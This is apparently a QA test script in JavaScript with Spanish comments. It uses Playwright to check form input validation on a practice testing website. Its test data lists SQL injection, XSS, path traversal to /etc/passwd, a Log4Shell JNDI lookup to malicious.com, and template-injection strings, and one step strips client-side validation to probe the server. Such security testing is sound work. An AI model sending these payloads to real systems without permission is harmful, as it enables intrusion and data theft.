// SCRIPT AUTOMATIZADO PARA VALIDAR CORRECCIÓN DE VALIDACIÓN INSUFICIENTE - DEM-17
// Test Case: Validar corrección de validación insuficiente en campos de entrada
// Bug Relacionado: DEM-14

const { chromium } = require('@playwright/test');

(async () => {
  const browser = await chromium.launch({ headless: false });
  const page = await browser.newPage();
  
  try {
    console.log('🔍 Iniciando test de validación de entrada - DEM-17');
    
    let vulnerabilityCount = 0;
    
    // Paso 1: Navegar a la página objetivo
    await page.goto('https://qarmy.ar/webs-practicas-testing/');
    console.log('✅ Navegación exitosa a la página objetivo');
    
    // Localizar elementos del formulario (intento genérico)
    const allInputs = await page.locator('input').all();
    const allButtons = await page.locator('button').all();
    
    console.log(`🔍 Encontrados ${allInputs.length} campos de entrada y ${allButtons.length} botones`);
    
    // Intentar encontrar campos de nombre y email
    let nombreField = null;
    let emailField = null;
    let submitButton = null;
    
    try {
      nombreField = page.locator('input[name="nombre"], input[placeholder*="nombre"], input[id*="nombre"]').first();
      emailField = page.locator('input[name="email"], input[placeholder*="email"], input[id*="email"], input[type="email"]').first();
      submitButton = page.locator('button[type="submit"], button:has-text("Suscribirse"), button:has-text("Enviar")').first();
    } catch (error) {
      console.log('⚠️ Usando selectores genéricos para campos');
      nombreField = allInputs[0] || page.locator('input').first();
      emailField = allInputs[1] || page.locator('input').nth(1);
      submitButton = allButtons[0] || page.locator('button').first();
    }
    
    // Test 1: Verificar límites de longitud
    console.log('🧪 Test 1: Verificando límites de longitud');
    const longString = 'A'.repeat(1000);
    
    try {
      // Usar el primer input encontrado para testing
      const firstInput = allInputs[0];
      if (firstInput) {
        await firstInput.clear();
        await firstInput.fill(longString);
        
        // Intentar submit si hay botón
        if (allButtons.length > 0) {
          await allButtons[0].click();
          await page.waitForTimeout(1000);
        }
        
        const inputValue = await firstInput.inputValue();
        if (inputValue.length > 255) { 
          console.warn(`⚠️ Warning: String excesivamente largo aceptado (${inputValue.length} chars)`);
          vulnerabilityCount++;
        } else {
          console.log(`✅ Límite de longitud aplicado correctamente: ${inputValue.length} chars`);
        }
      }
    } catch (error) {
      console.log('⚠️ No se pudo realizar test de longitud:', error.message);
    }
    
    // Test 2: Verificar caracteres especiales maliciosos
    console.log('🧪 Test 2: Verificando sanitización de caracteres especiales');
    const maliciousInputs = [
      "'; DROP TABLE users; --",
      '"><img src=x onerror=alert(1)>',
      '../../../etc/passwd',
      '${jndi:ldap://malicious.com/a}',
      '<%= 7*7 %>',
      '{{7*7}}',
      'admin\' OR \'1\'=\'1',
      'UNION SELECT password FROM users--'
    ];
    
    for (const maliciousInput of maliciousInputs) {
      try {
        console.log(`Testing malicious input: ${maliciousInput}`);
        
        if (allInputs.length > 0) {
          const testInput = allInputs[0];
          await testInput.clear();
          await testInput.fill(maliciousInput);
          
          if (allButtons.length > 0) {
            await allButtons[0].click();
            await page.waitForTimeout(1000);
          }
          
          const processedValue = await testInput.inputValue();
          
          // Verificar sanitización
          if (processedValue === maliciousInput) {
            console.warn(`⚠️ Warning: Malicious input not sanitized: ${maliciousInput}`);
            vulnerabilityCount++;
          } else {
            console.log(`✅ Input sanitized: "${maliciousInput}" -> "${processedValue}"`);
          }
          
          // Verificar que no se produce error SQL o ejecución
          const pageContent = await page.content();
          if (pageContent.includes('SQL') || pageContent.includes('error') || 
              pageContent.includes('mysql') || pageContent.includes('database')) {
            console.error(`❌ FALLO: Posible SQL error detected for input: ${maliciousInput}`);
            vulnerabilityCount++;
          }
        }
      } catch (error) {
        console.log(`⚠️ Error testing malicious input "${maliciousInput}":`, error.message);
      }
    }
    
    // Test 3: Verificar validación de email malformado
    console.log('🧪 Test 3: Verificando validación de email');
    const maliciousEmails = [
      "admin'><script>alert(1)</script>@test.com",
      'test@test..com',
      'test@',
      '@test.com',
      'test@test.com; DROP TABLE users;',
      'test<script>alert(1)</script>@test.com'
    ];
    
    for (const maliciousEmail of maliciousEmails) {
      await emailField.clear();
      await emailField.fill(maliciousEmail);
      await submitButton.click();
      await page.waitForTimeout(1000);
      
      // Verificar si hay mensaje de error apropiado
      const errorMessages = await page.locator('.error, .invalid, [class*="error"]').all();
      const hasEmailError = errorMessages.length > 0;
      
      if (hasEmailError) {
        console.log(`✅ Email validation working for: ${maliciousEmail}`);
      } else {
        console.warn(`⚠️ Warning: Invalid email accepted: ${maliciousEmail}`);
      }
    }
    
    // Test 4: Verificar validación del lado servidor (bypass cliente)
    console.log('🧪 Test 4: Verificando validación del lado servidor');
    
    // Simular envío directo bypassing cliente
    await page.evaluate(() => {
      // Deshabilitar validación HTML5
      const inputs = document.querySelectorAll('input[required]');
      inputs.forEach(input => input.removeAttribute('required'));
      
      const emailInputs = document.querySelectorAll('input[type="email"]');
      emailInputs.forEach(input => input.type = 'text');
    });
    
    await nombreField.fill("ServerSideTest<script>alert(1)</script>");
    await emailField.fill("invalid-email-format");
    await submitButton.click();
    await page.waitForTimeout(2000);
    
    // Verificar respuesta del servidor
    const finalContent = await page.content();
    if (finalContent.includes('<script>')) {
      console.error('❌ FALLO: Server-side validation insufficient');
      throw new Error('Server-side validation bypass detected');
    } else {
      console.log('✅ Server-side validation working correctly');
    }
    
    // Capturar evidencia
    await page.screenshot({ 
      path: `evidence_input_validation_${Date.now()}.png`,
      fullPage: true
    });
    
    console.log('🎯 Test DEM-17 completado - Input validation appears to be working');
    
    // Test de robustez con casos extremos
    console.log('🧪 Test: Verificar robustez de validación con casos extremos');
    
    // Reutilizar los campos ya definidos
    
    // Test casos extremos
    const extremeCases = [
      '', // Empty
      ' ', // Solo espacios
      '\n\r\t', // Caracteres especiales de formato
      '🚀🔒💀', // Emojis
      'ñáéíóúü', // Caracteres con tildes
      'русский', // Caracteres cirílicos
      '中文', // Caracteres chinos
      '১২৩৪৫', // Números bengalíes
    ];
    
    for (const testCase of extremeCases) {
      await nombreField.clear();
      await nombreField.fill(testCase);
      
      const value = await nombreField.inputValue();
      console.log(`Extreme case: "${testCase}" -> "${value}"`);
      
      // Verificar manejo apropiado
      expect(value).toBeDefined();
    }
    
    console.log('✅ Extreme cases handled appropriately');
    
    // Capturar evidencia
    const timestamp = Date.now();
    await page.screenshot({ 
      path: `evidence_input_validation_${timestamp}.png`,
      fullPage: true 
    });
    console.log(`📸 Evidencia capturada: evidence_input_validation_${timestamp}.png`);
    
    console.log('🎯 RESULTADO FINAL: Test de validación de inputs completado');
    console.log(JSON.stringify({
      testCase: 'DEM-17',
      bugRelated: 'DEM-14', 
      status: 'COMPLETED',
      vulnerabilitiesFound: vulnerabilityCount,
      evidence: `evidence_input_validation_${timestamp}.png`,
      summary: 'Input validation security test executed'
    }, null, 2));
    
  } catch (error) {
    console.error('❌ Error durante la ejecución:', error);
    process.exit(1);
  } finally {
    await browser.close();
  }
})();